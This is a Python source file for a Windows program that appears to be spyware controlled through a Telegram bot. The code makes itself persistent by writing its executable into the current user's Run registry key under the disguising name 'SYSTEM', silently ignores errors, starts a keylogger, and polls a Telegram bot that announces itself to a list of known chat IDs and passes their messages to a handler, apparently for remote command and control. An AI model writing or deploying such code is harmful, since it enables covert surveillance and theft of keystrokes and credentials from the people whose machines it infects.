import os
import sys
import time
import winreg
import asyncio

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import Message
from config import TOKEN, KNOWN_IDS
from handlers import handle_message, send_safe_message
from loggers import setup_logging, start_keylogger


def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.executable)

        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )

        try:
            winreg.QueryValueEx(key, "SYSTEM")
        except FileNotFoundError:
            winreg.SetValueEx(
                key,
                "SYSTEM",
                0,
                winreg.REG_SZ,
                exe_path
            )

        winreg.CloseKey(key)

    except Exception as e:
        pass


async def main():
    add_to_startup()

    setup_logging()
    start_keylogger()

    bot = Bot(token=TOKEN)
    dp = Dispatcher()

    @dp.message()
    async def handle_all_messages(message: Message):
        await handle_message(message, bot)

    for chat_id in KNOWN_IDS:
        await send_safe_message(bot, chat_id, "Бот запущен")

    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())